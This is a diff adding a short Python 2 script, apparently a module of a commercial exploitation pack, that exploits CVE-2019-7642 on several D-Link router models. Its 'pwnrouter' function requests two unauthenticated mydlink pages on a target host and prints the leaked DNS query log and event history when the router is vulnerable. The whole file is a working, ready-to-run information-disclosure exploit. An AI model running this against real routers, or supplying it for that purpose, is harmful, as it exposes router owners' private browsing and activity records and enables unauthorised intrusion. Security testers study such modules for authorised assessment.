@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_link_27'
+_vendor_ = 'd-link'
+_model_  = ['DIR-817LW','DIR-850L','DIR-816L','DIR-868L']
+_vuln_   = 'Information Disclosure Vulnerability'
+_cve_    = 'CVE-2019-7642'
+_ref_    = 'https://github.com/xw77cve/CVE-2019-7642'
+_port_   = 8080
+
+def pwnrouter(host,port=_port_):
+  urls = ['/mydlink/get_LogDnsQuery.asp', '/mydlink/get_TriggedEventHistory.asp']
+  for url in urls:
+    try:
+      url = 'http://%s:%d%s' % (host,port,url)    
+      response = requests.get(url)
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+    if response is None:
+      print '[+] %s not vulnerable' % host
+      return      
+    if '<record>' in response.text:
+      print '[+] %s vulnerable\n' % host
+      print response.text        
+    else:            
+      print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
